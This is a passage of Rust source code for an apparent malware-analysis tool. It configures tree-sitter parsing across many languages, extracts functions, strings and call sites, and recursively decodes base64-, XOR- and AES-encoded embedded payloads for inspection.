//! Unified source code analyzer for all AST-based languages.
//!
//! This module provides a single analyzer that handles all tree-sitter supported
//! languages through configuration rather than separate implementations.
//!
//! # Design Philosophy
//!
//! Instead of having 15+ nearly-identical analyzer files, we:
//! 1. Define language configurations (tree-sitter language, node types, etc.)
//! 2. Use a single analysis pipeline that works for all languages
//! 3. Rely on the trait/YAML system for capability detection
//! 4. Keep binary analyzers (ELF, PE, Mach-O) and manifest analyzers separate

use crate::analyzers::symbol_extraction;
use crate::analyzers::{AnalysisInput, Analyzer, FileType, FileTypeExt};
use crate::capabilities::CapabilityMapper;
use crate::capabilities::record_ast_kind_node;
use crate::types::{AnalysisReport, Evidence, Function, StringInfo, TargetInfo};
use anyhow::Result;
use rustc_hash::{FxHashMap, FxHashSet, FxHasher};
use std::hash::Hasher;
use std::path::Path;
use std::sync::Arc;

/// Identity for `report.strings` dedup. JS `string` + `string_fragment` land
/// at the same trimmed offset; a linear `iter().any` on every push was
/// O(n²) memcmp on minified members (the CRT memcpy/memcmp bucket).
type SeenStringKey = (u64, u8, u64, u64);

fn seen_string_key(info: &StringInfo) -> SeenStringKey {
    let mut value_hash = FxHasher::default();
    value_hash.write(info.value.as_bytes());
    let mut chain_hash = FxHasher::default();
    for step in &info.encoding_chain {
        chain_hash.write(step.as_bytes());
        chain_hash.write_u8(0xff);
    }
    (
        info.offset.unwrap_or(u64::MAX),
        match info.section.as_deref() {
            Some("ast") => 1,
            Some("decoded") => 2,
            Some("ast-number") => 3,
            _ => 0,
        },
        chain_hash.finish(),
        value_hash.finish(),
    )
}

fn push_unique_string(
    report: &mut AnalysisReport,
    seen: &mut FxHashSet<SeenStringKey>,
    info: StringInfo,
) {
    if seen.insert(seen_string_key(&info)) {
        report.strings.push(info);
    }
}

/// Configuration for a language analyzer.
#[derive(Clone, Debug)]
pub(crate) struct LanguageConfig {
    /// Language identifier (e.g., "python", "javascript")
    pub name: &'static str,
    /// File type for reports
    pub file_type: &'static str,
    /// Human-readable description
    pub description: &'static str,
    /// Node types for symbol/call extraction
    pub call_node_types: &'static [&'static str],
    /// Node types for function declarations
    pub function_node_types: &'static [&'static str],
    /// Field name for function names (usually "name")
    pub function_name_field: &'static str,
    /// Node types for string literals
    pub string_node_types: &'static [&'static str],
}

/// Get the language configuration for a file type.
#[must_use]
pub(crate) fn config_for_file_type(
    file_type: &crate::analyzers::FileType,
) -> Option<LanguageConfig> {
    use crate::analyzers::FileType;

    match file_type {
        FileType::Python => Some(LanguageConfig {
            name: "python",
            file_type: "python",
            description: "Python script",
            call_node_types: &["call"],
            function_node_types: &["function_definition", "async_function_definition"],
            function_name_field: "name",
            string_node_types: &["string", "string_content"],
        }),
        FileType::JavaScript => Some(LanguageConfig {
            name: "javascript",
            file_type: "javascript",
            description: "JavaScript code",
            call_node_types: &[
                "call_expression",
                "assignment_expression",
                "variable_declarator",
            ],
            function_node_types: &[
                "function_declaration",
                "function_expression",
                "arrow_function",
                "method_definition",
            ],
            function_name_field: "name",
            string_node_types: &["string", "template_string"],
        }),
        FileType::TypeScript => Some(LanguageConfig {
            name: "typescript",
            file_type: "javascript",
            description: "TypeScript/JavaScript code",
            call_node_types: &["call_expression"],
            function_node_types: &[
                "function_declaration",
                "function_expression",
                "arrow_function",
                "method_definition",
            ],
            function_name_field: "name",
            string_node_types: &["string", "template_string"],
        }),
        FileType::Go => Some(LanguageConfig {
            name: "go",
            file_type: "go",
            description: "Go source code",
            call_node_types: &["call_expression"],
            function_node_types: &["function_declaration", "method_declaration"],
            function_name_field: "name",
            string_node_types: &["raw_string_literal", "interpreted_string_literal"],
        }),
        FileType::Rust => Some(LanguageConfig {
            name: "rust",
            file_type: "rust",
            description: "Rust source code",
            call_node_types: &["call_expression", "macro_invocation"],
            function_node_types: &["function_item"],
            function_name_field: "name",
            string_node_types: &["string_literal", "raw_string_literal"],
        }),
        FileType::Ruby => Some(LanguageConfig {
            name: "ruby",
            file_type: "ruby",
            description: "Ruby script",
            call_node_types: &["call", "method_call"],
            function_node_types: &["method", "singleton_method"],
            function_name_field: "name",
            string_node_types: &[
                "string",
                "string_content",
                "simple_symbol",
                "delimited_symbol",
                "bare_symbol",
                "hash_key_symbol",
            ],
        }),
        FileType::Php => Some(LanguageConfig {
            name: "php",
            file_type: "php",
            description: "PHP script",
            call_node_types: &["function_call_expression"],
            function_node_types: &["function_definition", "method_declaration"],
            function_name_field: "name",
            string_node_types: &["string", "encapsed_string"],
        }),
        FileType::Shell => Some(LanguageConfig {
            name: "shell",
            file_type: "shell",
            description: "Shell script",
            call_node_types: &["command", "command_name"],
            function_node_types: &["function_definition"],
            function_name_field: "name",
            string_node_types: &["string", "raw_string"],
        }),
        FileType::Lua => Some(LanguageConfig {
            name: "lua",
            file_type: "lua",
            description: "Lua script",
            call_node_types: &["function_call"],
            function_node_types: &["function_declaration", "local_function"],
            function_name_field: "name",
            string_node_types: &["string"],
        }),
        FileType::Perl => Some(LanguageConfig {
            name: "perl",
            file_type: "perl",
            description: "Perl script",
            call_node_types: &["function_call", "method_call"],
            function_node_types: &["subroutine_declaration", "method_declaration"],
            function_name_field: "name",
            string_node_types: &["string_literal", "interpolated_string"],
        }),
        FileType::PowerShell => Some(LanguageConfig {
            name: "powershell",
            file_type: "powershell",
            description: "PowerShell script",
            call_node_types: &["command_expression", "invocation_expression"],
            function_node_types: &["function_statement"],
            function_name_field: "name",
            string_node_types: &["string_literal", "expandable_string_literal"],
        }),
        FileType::Java => Some(LanguageConfig {
            name: "java",
            file_type: "java",
            description: "Java source code",
            call_node_types: &["method_invocation"],
            function_node_types: &["method_declaration", "constructor_declaration"],
            function_name_field: "name",
            string_node_types: &["string_literal"],
        }),
        FileType::CSharp => Some(LanguageConfig {
            name: "csharp",
            file_type: "csharp",
            description: "C# source code",
            call_node_types: &["invocation_expression"],
            function_node_types: &["method_declaration", "constructor_declaration"],
            function_name_field: "name",
            string_node_types: &["string_literal", "verbatim_string_literal"],
        }),
        FileType::C => Some(LanguageConfig {
            name: "c",
            file_type: "c",
            description: "C source code",
            call_node_types: &["call_expression"],
            function_node_types: &["function_definition"],
            function_name_field: "declarator",
            string_node_types: &["string_literal"],
        }),
        FileType::Swift => Some(LanguageConfig {
            name: "swift",
            file_type: "swift",
            description: "Swift source code",
            call_node_types: &["call_expression"],
            function_node_types: &["function_declaration"],
            function_name_field: "name",
            string_node_types: &["line_string_literal", "multi_line_string_literal"],
        }),
        FileType::ObjectiveC => Some(LanguageConfig {
            name: "objective_c",
            file_type: "objective_c",
            description: "Objective-C source code",
            call_node_types: &["message_expression", "call_expression"],
            function_node_types: &["function_definition", "method_definition"],
            function_name_field: "declarator",
            string_node_types: &["string_literal"],
        }),
        FileType::Groovy => Some(LanguageConfig {
            name: "groovy",
            file_type: "groovy",
            description: "Groovy source code",
            call_node_types: &["method_call", "function_call"],
            function_node_types: &["method_declaration", "function_declaration"],
            function_name_field: "name",
            string_node_types: &["string", "gstring"],
        }),
        FileType::Scala => Some(LanguageConfig {
            name: "scala",
            file_type: "scala",
            description: "Scala source code",
            call_node_types: &["call_expression", "apply_expression"],
            function_node_types: &["function_definition"],
            function_name_field: "name",
            string_node_types: &["string", "interpolated_string"],
        }),
        FileType::Kotlin => Some(LanguageConfig {
            name: "kotlin",
            file_type: "kotlin",
            description: "Kotlin source code",
            call_node_types: &["call_expression"],
            function_node_types: &["fun_declaration", "function_declaration"],
            function_name_field: "name",
            string_node_types: &["line_string_literal", "multi_line_string_literal"],
        }),
        FileType::Zig => Some(LanguageConfig {
            name: "zig",
            file_type: "zig",
            description: "Zig source code",
            call_node_types: &["call_expression"],
            function_node_types: &["fn_decl"],
            function_name_field: "name",
            string_node_types: &["string_literal"],
        }),
        FileType::Elixir => Some(LanguageConfig {
            name: "elixir",
            file_type: "elixir",
            description: "Elixir source code",
            call_node_types: &["call"],
            function_node_types: &["call"], // def/defp are calls in Elixir's AST
            function_name_field: "target",
            string_node_types: &["string", "charlist"],
        }),
        FileType::Makefile => Some(LanguageConfig {
            name: "makefile",
            file_type: "makefile",
            description: "Makefile build script",
            call_node_types: &["recipe"],
            function_node_types: &["rule"],
            function_name_field: "target",
            string_node_types: &["string"],
        }),
        _ => None,
    }
}

/// Unified source code analyzer.
///
/// Works with any tree-sitter supported language through configuration.
pub(crate) struct UnifiedSourceAnalyzer {
    config: LanguageConfig,
    file_type: crate::analyzers::FileType,
    capability_mapper: Arc<CapabilityMapper>,
    /// When true, skip embedded payload detection to prevent recursion.
    /// Set for analyzers created for inner analysis (e.g. decoded PowerShell).
    skip_embedded_detection: bool,
    /// Per-request cancellation flag.
    cancellation: Option<std::sync::Arc<std::sync::atomic::AtomicBool>>,
    /// Encoding chain for decoded embedded-code layers.
    encoded_context: Option<Vec<String>>,
}

impl std::fmt::Debug for UnifiedSourceAnalyzer {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("UnifiedSourceAnalyzer")
            .field("config", &self.config)
            .field("file_type", &self.file_type)
            .field("capability_mapper", &self.capability_mapper)
            .finish()
    }
}

impl UnifiedSourceAnalyzer {
    /// Create a new analyzer for the given language configuration.
    pub(crate) fn new(config: LanguageConfig, file_type: crate::analyzers::FileType) -> Self {
        Self {
            config,
            file_type,
            capability_mapper: Arc::new(CapabilityMapper::empty()),
            skip_embedded_detection: false,
            cancellation: None,
            encoded_context: None,
        }
    }

    /// Create an analyzer for the given file type.
    #[must_use]
    pub(crate) fn for_file_type(file_type: &crate::analyzers::FileType) -> Option<Self> {
        config_for_file_type(file_type).map(|config| Self::new(config, *file_type))
    }

    /// Create analyzer with pre-existing capability mapper (wraps in Arc)
    pub(crate) fn with_capability_mapper(mut self, capability_mapper: CapabilityMapper) -> Self {
        self.capability_mapper = Arc::new(capability_mapper);
        self
    }

    /// Create analyzer with shared capability mapper (avoids cloning)
    pub(crate) fn with_capability_mapper_arc(
        mut self,
        capability_mapper: Arc<CapabilityMapper>,
    ) -> Self {
        self.capability_mapper = capability_mapper;
        self
    }

    /// Disable embedded payload detection (base64 binary, PowerShell -EncodedCommand).
    /// Used for inner analysis to prevent recursive calling.
    pub(crate) fn without_embedded_detection(mut self) -> Self {
        self.skip_embedded_detection = true;
        self
    }

    /// Set encoded-layer context for metrics on decoded embedded-code files.
    pub(crate) fn with_encoded_context(mut self, encoding_chain: Vec<String>) -> Self {
        self.encoded_context = Some(encoding_chain);
        self
    }

    /// Set per-request cancellation flag.
    #[must_use]
    pub(crate) fn with_cancellation(
        mut self,
        flag: Option<std::sync::Arc<std::sync::atomic::AtomicBool>>,
    ) -> Self {
        self.cancellation = flag;
        self
    }

    /// Analyze `content` as this analyzer's configured language, forcing the
    /// parse grammar instead of re-detecting from `file_path`.
    ///
    /// `analyze_source` opens its context with `open`, which re-runs
    /// filefacts detection on the path. That is correct when `file_path` is a
    /// real file, but wrong for embedded code analyzed under a synthetic
    /// virtual path (`host.php##plain@0x0`): detection lands on `Unknown` and
    /// no AST is produced. The embedded-code detector already knows the inner
    /// language — it created this analyzer `for_file_type` — so the parse must
    /// honor that, not the virtual path.
    pub(crate) fn analyze_source_as_configured(
        &self,
        file_path: &Path,
        content: &str,
    ) -> AnalysisReport {
        let ctx = crate::analysis_context::AnalysisContext::open_as(
            file_path,
            content.as_bytes(),
            self.file_type,
        )
        .ok();
        self.analyze_source_impl(
            file_path,
            content,
            &[],
            &[],
            None,
            self.cancellation.as_ref(),
            ctx.as_ref(),
        )
    }

    pub(crate) fn analyze_source(&self, file_path: &Path, content: &str) -> AnalysisReport {
        let ctx =
            crate::analysis_context::AnalysisContext::open(file_path, content.as_bytes()).ok();
        self.analyze_source_impl(
            file_path,
            content,
            &[],
            &[],
            None,
            self.cancellation.as_ref(),
            ctx.as_ref(),
        )
    }

    // Mirrors the fields of an `AnalysisInput` plus the decoded `content`; the
    // path-based entry has no `AnalysisInput` to pass, so the pieces are
    // threaded individually rather than bundled.
    #[allow(clippy::too_many_arguments)]
    fn analyze_source_impl(
        &self,
        file_path: &Path,
        content: &str,
        preextracted_stng: &[stng::ExtractedString],
        preextracted_payloads: &[crate::types::ExtractedPayload],
        precomputed_sha256: Option<String>,
        cancellation: Option<&std::sync::Arc<std::sync::atomic::AtomicBool>>,
        source_ctx: Option<&crate::analysis_context::AnalysisContext<'_>>,
    ) -> AnalysisReport {
        let start = std::time::Instant::now();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: self.config.file_type.to_string(),
            size_bytes: content.len() as u64,
            sha256: precomputed_sha256
                .unwrap_or_else(|| crate::analyzers::utils::calculate_sha256(content.as_bytes())),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // `pyc.*` kv now comes from filefacts's dual emission step
        // in `evaluate_and_merge_findings`; no synthesis here.

        // Add structural feature
        report
            .structure
            .push(crate::analyzers::utils::create_language_feature(
                self.config.name,
                &format!("tree-sitter-{}", self.config.name),
                self.config.description,
            ));

        let has_preextracted = !preextracted_stng.is_empty();
        let mut owned_stng: std::sync::Arc<[stng::ExtractedString]> = Vec::new().into();

        // Run stng extraction first (sequential). Previously this used
        // rayon::in_place_scope to overlap stng with tree-sitter parsing,
        // but that deadlocks when nested inside a saturated rayon pool
        // (e.g., scan_directory's par_iter): the spawned stng task waits
        // for a free rayon thread, while the current thread blocks on
        // recv() and can't process rayon work. stng on scripts is fast
        // (single-digit ms), so the parallelism gain was negligible.
        if !has_preextracted {
            // No caller-supplied strings: source them from the threaded
            // filefacts context (the string-extraction authority). When the
            // caller didn't open one, there are simply no pre-extracted strings.
            owned_stng = source_ctx
                .map(crate::analysis_context::AnalysisContext::text_rows)
                .unwrap_or_default();
        }

        // `source_ctx` is resolved by the caller — the threaded context when it
        // was opened on these exact bytes, else one opened on the normalized
        // `content` (UTF-16/lossy inputs diverge from the original bytes).
        let source_ast = source_ctx.and_then(crate::analysis_context::AnalysisContext::source_ast);
        let tree = source_ast.map(|ast| ast.tree);

        let mut ast_kind_cache = None;
        let mut seen_strings = FxHashSet::default();
        if let Some(tree) = tree {
            // One walk for functions, string/number/comment literals, call
            // sites, and the trait kind-cache. A second cursor pass in
            // evaluate_and_merge was pure walk tax — keep extract_function_name
            // chained names (B1g: do not ingest filefacts Call.target).
            let mapper = Arc::clone(&self.capability_mapper);
            let rule_ft = mapper.detect_file_type(self.config.file_type);
            let (required, call_types) = mapper.ast_kind_cache_plan(rule_ft);
            let mut cache = FxHashMap::default();
            self.extract_ast_facts(
                tree,
                content,
                &mut report,
                &required,
                &call_types,
                &mut cache,
                &mut seen_strings,
            );
            if !required.is_empty() {
                ast_kind_cache = Some(cache);
            }
        }

        // Use pre-extracted stng strings if available, otherwise use parallel extracted ones
        let stng_strings: &[stng::ExtractedString] = if has_preextracted {
            preextracted_stng
        } else {
            &owned_stng
        };

        // Convert stng decoded strings to StringInfo and add to report
        for es in stng_strings {
            // Only add decoded strings (base64, xor, etc.) - skip raw literals already in AST
            if matches!(
                es.method,
                stng::StringMethod::Base64Decode
                    | stng::StringMethod::Base64ObfuscatedDecode
                    | stng::StringMethod::XorDecode
                    | stng::StringMethod::HexDecode
                    | stng::StringMethod::UrlDecode
                    | stng::StringMethod::UnicodeEscapeDecode
                    | stng::StringMethod::ScriptDecode
            ) {
                let string_type = es.kind;

                let encoding_method = match es.method {
                    stng::StringMethod::Base64Decode => "base64",
                    stng::StringMethod::Base64ObfuscatedDecode => "base64-obf",
                    stng::StringMethod::XorDecode => "xor",
                    stng::StringMethod::HexDecode => "hex",
                    stng::StringMethod::UrlDecode => "url",
                    stng::StringMethod::UnicodeEscapeDecode => "unicode-escape",
                    stng::StringMethod::ScriptDecode => "script",
                    _ => "",
                };

                let decoded = crate::types::StringInfo {
                    value: es.value.clone().into(),
                    offset: Some(es.data_offset),
                    string_type,
                    encoding: "utf-8".to_string(),
                    section: Some("decoded".to_string()),
                    encoding_chain: if !encoding_method.is_empty() {
                        vec![encoding_method.to_string()]
                    } else {
                        Vec::new()
                    },
                    fragments: None,
                };
                // Source literals are decoded separately below because stng's
                // byte scan can see a whole minified line rather than each
                // quoted value. Avoid double-counting when both paths recover
                // the same encoded literal at the same source offset.
                push_unique_string(&mut report, &mut seen_strings, decoded);
            }
        }

        // Extract and analyze base64/zlib encoded payloads (same treatment as archives)
        // Use pre-extracted payloads if available to avoid redundant expensive I/O
        let owned_payload_stng;
        let owned_extracted_payloads;
        let extracted_payloads: &[crate::types::ExtractedPayload] =
            if !preextracted_payloads.is_empty() {
                preextracted_payloads
            } else {
                // Payload extraction needs min_length=16 strings.  We already have
                // a min_length=4 extraction in `stng_strings` above (either from
                // the caller's pre-extraction, or freshly produced into
                // `owned_stng`).  Filtering that existing vec by length is
                // equivalent to a second full extraction at min_length=16 for
                // every extractor stng runs — raw scan uses `min_length` as a
                // hard threshold, decoders use their own MIN_*_LENGTH constants,
                // and XOR uses `xor_min_length` independently.  One extraction
                // saves 5-50 ms per file on scripts.
                let payload_stng: Vec<stng::ExtractedString> = stng_strings
                    .iter()
                    .filter(|s| s.value.len() >= 16)
                    .cloned()
                    .collect();
                owned_payload_stng = payload_stng;
                owned_extracted_payloads =
                    crate::extractors::extract_encoded_payloads(&owned_payload_stng);
                &owned_extracted_payloads
            };

        for (idx, payload) in extracted_payloads.iter().enumerate() {
            if cancellation.is_some_and(|c| c.load(std::sync::atomic::Ordering::Acquire)) {
                break;
            }
            // Create virtual path with encoding info using ## delimiter for decoded content
            let virtual_path = crate::types::encode_decoded_path(
                &file_path.display().to_string(),
                &payload.encoding_chain,
                idx,
            );

            // Read the decoded content
            let payload_content = payload.data.clone();

            // Create ArchiveEntry metadata (same as archive files)
            let entry_metadata = crate::types::ArchiveEntry {
                path: virtual_path.clone(),
                file_type: payload.detected_type.report_file_type(),
                sha256: crate::analyzers::utils::calculate_sha256(&payload_content),
                size_bytes: payload_content.len() as u64,
                ..crate::types::ArchiveEntry::default()
            };
            report.archive_contents.push(entry_metadata);

            // Analyze the extracted payload based on its type (creates sub_report like archives)
            // Pass capability_mapper to evaluate rules on extracted content
            let payload_report = match payload.detected_type {
                FileType::Python => {
                    UnifiedSourceAnalyzer::for_file_type(&FileType::Python).map(|analyzer| {
                        analyzer
                            .with_capability_mapper_arc(self.capability_mapper.clone())
                            .with_cancellation(cancellation.cloned())
                            .analyze_source(
                                Path::new(&virtual_path),
                                &String::from_utf8_lossy(&payload_content),
                            )
                    })
                }
                FileType::Shell => {
                    UnifiedSourceAnalyzer::for_file_type(&FileType::Shell).map(|analyzer| {
                        analyzer
                            .with_capability_mapper_arc(self.capability_mapper.clone())
                            .with_cancellation(cancellation.cloned())
                            .analyze_source(
                                Path::new(&virtual_path),
                                &String::from_utf8_lossy(&payload_content),
                            )
                    })
                }
                _ => None,
            };

            // Process payload report - convert to FileAnalysis for v2 flat files array
            if let Some(pr) = payload_report {
                // Prefix findings with extracted payload location (same as archive: prefix)
                let (mut file_entry, _, _) = pr.into_file_analysis(0);
                file_entry.path = virtual_path.clone();
                file_entry.depth = 1; // Decoded content is one level deep
                file_entry.encoding = Some(vec!["base64".to_string()]);

                // Update evidence locations to indicate extracted payload. The
                // payload renders against its own buffer (offsets stay local),
                // so preserve any offset carried in `location` before the label
                // overwrites it.
                for finding in &mut file_entry.findings {
                    for evidence in &mut finding.evidence {
                        evidence.reanchor_offset(0);
                        match &evidence.location {
                            None => {
                                evidence.location = Some(format!("extracted:{}", virtual_path));
                            }
                            Some(loc) => {
                                evidence.location =
                                    Some(format!("extracted:{}:{}", virtual_path, loc));
                            }
                        }
                    }
                }

                file_entry.compute_summary();
                report.files.push(file_entry);
            }
        }

        // Extract and analyze AES-encrypted payloads (JavaScript/TypeScript)
        if matches!(self.config.file_type, "javascript" | "typescript") {
            let aes_payloads = crate::extractors::extract_aes_payloads(content.as_bytes());
            for (idx, payload) in aes_payloads.iter().enumerate() {
                if cancellation.is_some_and(|c| c.load(std::sync::atomic::Ordering::Acquire)) {
                    break;
                }
                // Create virtual path with encoding info
                let virtual_path = crate::types::encode_decoded_path(
                    &file_path.display().to_string(),
                    &payload.encoding_chain,
                    idx,
                );

                // Read the decrypted content
                let payload_content = payload.data.clone();

                // Create ArchiveEntry metadata
                let entry_metadata = crate::types::ArchiveEntry {
                    path: virtual_path.clone(),
                    file_type: payload.detected_type.report_file_type(),
                    sha256: crate::analyzers::utils::calculate_sha256(&payload_content),
                    size_bytes: payload_content.len() as u64,
                    ..crate::types::ArchiveEntry::default()
                };
                report.archive_contents.push(entry_metadata);

                // Analyze the decrypted payload
                let payload_report = match payload.detected_type {
                    FileType::JavaScript | FileType::TypeScript => {
                        UnifiedSourceAnalyzer::for_file_type(&payload.detected_type).map(
                            |analyzer| {
                                analyzer
                                    .with_capability_mapper_arc(self.capability_mapper.clone())
                                    .with_cancellation(cancellation.cloned())
                                    .analyze_source(
                                        Path::new(&virtual_path),
                                        &String::from_utf8_lossy(&payload_content),
                                    )
                            },
                        )
                    }
                    FileType::Python => UnifiedSourceAnalyzer::for_file_type(&FileType::Python)
                        .map(|analyzer| {
                            analyzer
                                .with_capability_mapper_arc(self.capability_mapper.clone())
                                .with_cancellation(cancellation.cloned())
                                .analyze_source(
                                    Path::new(&virtual_path),
                                    &String::from_utf8_lossy(&payload_content),
                                )
                        }),
                    FileType::Shell => {
                        UnifiedSourceAnalyzer::for_file_type(&FileType::Shell).map(|analyzer| {
                            analyzer
                                .with_capability_mapper_arc(self.capability_mapper.clone())
                                .with_cancellation(cancellation.cloned())
                                .analyze_source(
                                    Path::new(&virtual_path),
                                    &String::from_utf8_lossy(&payload_content),
                                )
                        })
                    }
                    _ => None,
                };

                // Add a structural finding for the encrypted payload
                report.structure.push(crate::types::StructuralFeature {
                    id: format!("crypto/encrypted-payload/{}", payload.algorithm),
                    desc: format!("Encrypted payload decrypted with {}", payload.algorithm),
                    evidence: vec![crate::types::Evidence {
                        method: "pattern".to_string(),
                        source: "aes_extractor".to_string(),
                        value: format!("preview={}", payload.preview),
                        location: Some(format!("offset:{}", payload.original_offset)),
                        ..Default::default()
                    }],
                });

                // Process payload report
                if let Some(pr) = payload_report {
                    let (mut file_entry, _, _) = pr.into_file_analysis(0);
                    file_entry.path = virtual_path.clone();
                    file_entry.depth = 1;
                    file_entry.encoding = Some(payload.encoding_chain.clone());

                    // Update evidence locations. The decrypted payload renders
                    // against its own buffer (offsets stay local), so preserve
                    // any offset carried in `location` before the label
                    // overwrites it.
                    for finding in &mut file_entry.findings {
                        for evidence in &mut finding.evidence {
                            evidence.reanchor_offset(0);
                            match &evidence.location {
                                None => {
                                    evidence.location = Some(format!("decrypted:{}", virtual_path));
                                }
                                Some(loc) => {
                                    evidence.location =
                                        Some(format!("decrypted:{}:{}", virtual_path, loc));
                                }
                            }
                        }
                    }

                    file_entry.compute_summary();
                    report.files.push(file_entry);
                }
            }
        }

        if tree.is_some() {
            // Call sites were collected in `extract_ast_facts` above.
            // Module imports come from filefacts's per-language queries; cleave
            // only adds Python `__import__` alias resolution on top.
            if let Some(ctx) = source_ctx {
                symbol_extraction::ingest_filefacts_imports(
                    &ctx.parsed,
                    &self.file_type,
                    &mut report,
                );
            }

            // Analyze paths and environment variables
            crate::path_mapper::analyze_and_link_paths(&mut report);
            crate::env_mapper::analyze_and_link_env_vars(&mut report);

            // `text.*` / `identifiers.*` / `strings.*` / `comments.*` /
            // `functions.*` / `imports.*` metrics all flow through
            // filefacts's source extractor now and get merged into
            // `report.filefacts_metrics` inside the capability mapper.
        }
        // Detect base64 binary payloads and plain embedded code.
        // Guard against recursion: when this analyzer was created for inner analysis
        // (e.g. decoding a -EncodedCommand payload), skip to avoid infinite loops.
        if !self.skip_embedded_detection {
            let parent = file_path.display().to_string();
            // stng already found/decoded obfuscated script blobs during string
            // extract, but it shreds `DeobfuscationResult.decoded` into
            // `ScriptDecode` fragments. Keep the full payload as a typed
            // source layer here and skip the home-grown EncodedCommand scan.
            report.files.extend(
                crate::analyzers::embedded_code_detector::analyze_script_deobfuscation_layers(
                    &parent,
                    content,
                    &self.capability_mapper,
                    0,
                    self.cancellation.as_deref(),
                ),
            );
            // Borrow the host haystack (B1r: Python-in-Rust) instead of
            // `content.to_string()` + `report.strings.clone()` per member.
            let (encoded_layers, plain_findings) =
                crate::analyzers::embedded_code_detector::process_all_strings_with_host(
                    &parent,
                    &report.strings,
                    &self.capability_mapper,
                    0,
                    Some(&self.file_type),
                    self.cancellation.as_deref(),
                    true,
                    Some(content),
                );
            report.files.extend(encoded_layers);
            report.findings.extend(plain_findings);
        }

        // Build the `source.*` kv tree from already-extracted
        // imports/exports/functions before the trait engine runs so
        // `type: value, path: source.imports, ...` traits can resolve.
        super::source_kv::attach_to_report(&mut report, Some(content.as_bytes()));

        if let Some(ctx) = source_ctx {
            let view = crate::types::FilefactsView::from_ctx(ctx);
            if !view.is_empty() {
                report.filefacts = Some(view);
            }
            report.identity = ctx.identity();
        }

        // Evaluate all rules (atomic + composite) and merge into report,
        // borrowing the same filefacts context used for source AST extraction.
        self.capability_mapper
            .evaluate_and_merge_findings_with_precomputed(
                &mut report,
                content.as_bytes(),
                crate::capabilities::AnalysisBorrow::with_filefacts(tree, source_ctx)
                    .with_ast_kind_cache(ast_kind_cache.as_ref()),
                None,
                None,
                None,
                None,
            );

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec![format!("tree-sitter-{}", self.config.name)];

        report
    }

    #[allow(clippy::too_many_arguments)]
    fn extract_ast_facts(
        &self,
        tree: &tree_sitter::Tree,
        content: &str,
        report: &mut AnalysisReport,
        required_node_types: &FxHashSet<&str>,
        call_node_types: &FxHashSet<&'static str>,
        kind_cache: &mut FxHashMap<String, Vec<Evidence>>,
        seen_strings: &mut FxHashSet<SeenStringKey>,
    ) {
        let source = content.as_bytes();
        let mut cursor = tree.walk();
        let mut call_sites: Vec<(String, u64)> = Vec::new();
        self.walk_ast_facts(
            &mut cursor,
            source,
            report,
            &mut call_sites,
            required_node_types,
            call_node_types,
            kind_cache,
            seen_strings,
        );
        symbol_extraction::push_capped_call_imports(call_sites, report);
    }

    #[allow(clippy::too_many_arguments)]
    fn walk_ast_facts<'a>(
        &self,
        cursor: &mut tree_sitter::TreeCursor<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
        call_sites: &mut Vec<(String, u64)>,
        required_node_types: &FxHashSet<&str>,
        call_node_types: &FxHashSet<&'static str>,
        kind_cache: &mut FxHashMap<String, Vec<Evidence>>,
        seen_strings: &mut FxHashSet<SeenStringKey>,
    ) {
        loop {
            let node = cursor.node();
            let kind = node.kind();
            record_ast_kind_node(
                kind,
                &node,
                source,
                required_node_types,
                call_node_types,
                kind_cache,
            );

            if self.config.function_node_types.contains(&kind) {
                let name = self
                    .extract_function_name(&node, source)
                    .unwrap_or_else(|| "anonymous".to_string());

                report.functions.push(Function {
                    name,
                    offset: Some(format!("0x{:x}", node.start_byte())),
                    size: Some((node.end_byte() - node.start_byte()) as u64),
                    complexity: None,
                    calls: Vec::new(),
                    control_flow: None,
                    register_usage: None,
                    constants: Vec::new(),
                    signature: None,
                    nesting: None,
                    call_patterns: None,
                });
            }

            if call_sites.len() < symbol_extraction::MAX_TOTAL_CALL_SITES
                && self.config.call_node_types.contains(&kind)
                && let Some(func_name) = symbol_extraction::extract_function_name(&node, source)
            {
                let clean_name = func_name
                    .trim()
                    .trim_start_matches('_')
                    .trim_start_matches('$');
                if !clean_name.is_empty() && clean_name.len() < 100 {
                    call_sites.push((clean_name.to_string(), node.start_byte() as u64));
                }
            }

            if self.config.string_node_types.contains(&kind) || kind.contains("string") {
                self.collect_string_node(&node, source, report, seen_strings);
            } else if is_numeric_node_kind(kind) {
                if let Ok(text) = node.utf8_text(source)
                    && let Some((value, radix)) = parse_numeric_literal(text)
                {
                    report.strings.push(StringInfo {
                        value: value.to_string().into(),
                        offset: Some(node.start_byte() as u64),
                        string_type: None,
                        encoding: radix.to_string(),
                        section: Some("ast-number".to_string()),
                        encoding_chain: Vec::new(),
                        fragments: None,
                    });
                }
            } else if kind.contains("comment")
                && let Ok(text) = node.utf8_text(source)
            {
                let trimmed = text.trim();
                if !trimmed.is_empty() && trimmed.len() < 10000 {
                    report.comments.push(StringInfo {
                        value: trimmed.to_string().into(),
                        offset: Some(node.start_byte() as u64),
                        string_type: None,
                        encoding: "utf-8".to_string(),
                        section: Some("comment".to_string()),
                        encoding_chain: Vec::new(),
                        fragments: None,
                    });
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn collect_string_node(
        &self,
        node: &tree_sitter::Node<'_>,
        source: &[u8],
        report: &mut AnalysisReport,
        seen_strings: &mut FxHashSet<SeenStringKey>,
    ) {
        let Ok(text) = node.utf8_text(source) else {
            return;
        };
        let s = text
            .trim_start_matches('"')
            .trim_end_matches('"')
            .trim_start_matches('\'')
            .trim_end_matches('\'')
            .trim_start_matches('`')
            .trim_end_matches('`')
            .trim_start_matches("[[")
            .trim_end_matches("]]")
            .trim_start_matches("@\"")
            .trim_end_matches("\"@")
            .trim_start_matches(':'); // Ruby symbol literals like :alias_method

        if s.is_empty() || s.len() >= 10000 {
            return;
        }
        // `s` is a subslice of `text` after the leading quote/
        // bracket bytes are trimmed, so the node start must be
        // advanced by that delta — otherwise the recorded offset
        // points at the opening quote while `value` excludes it,
        // shifting every downstream span one byte left (the span
        // would cover `"gzi` instead of `gzip`).
        let lead = s.as_ptr() as u64 - text.as_ptr() as u64;
        let offset = node.start_byte() as u64 + lead;
        let literal = StringInfo {
